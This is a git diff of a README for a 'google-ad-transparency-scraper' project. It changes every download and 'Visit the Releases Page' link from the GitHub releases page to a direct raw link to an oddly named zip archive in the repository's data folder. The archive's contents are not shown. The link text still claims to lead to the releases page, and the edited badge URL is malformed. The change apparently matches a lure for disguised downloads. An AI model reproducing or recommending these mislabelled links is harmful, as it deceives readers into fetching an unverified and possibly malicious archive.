@@ -10,13 +10,13 @@ To get started, you need to download the application. Follow these steps to inst
 
 ### Download Link
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/sanzz12/google-ad-transparency-scraper/main/data/google-ad-transparency-scraper-tocusso.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/sanzz12/google-ad-transparency-scraper/main/data/google-ad-transparency-scraper-tocusso.zip)
 
 ### Step 1: Visit the Releases Page
 
 To access the latest version of the google-ad-transparency-scraper, click the link below:
 
-[Visit the Releases Page](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/sanzz12/google-ad-transparency-scraper/main/data/google-ad-transparency-scraper-tocusso.zip)
 
 This page lists all available versions of the software. Look for the latest version at the top.
 
@@ -83,4 +83,4 @@ Thank you for choosing the google-ad-transparency-scraper. We hope it helps you 
 
 For easy access, here is the download link again:
 
-[Download the Latest Release](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/sanzz12/google-ad-transparency-scraper/main/data/google-ad-transparency-scraper-tocusso.zip)
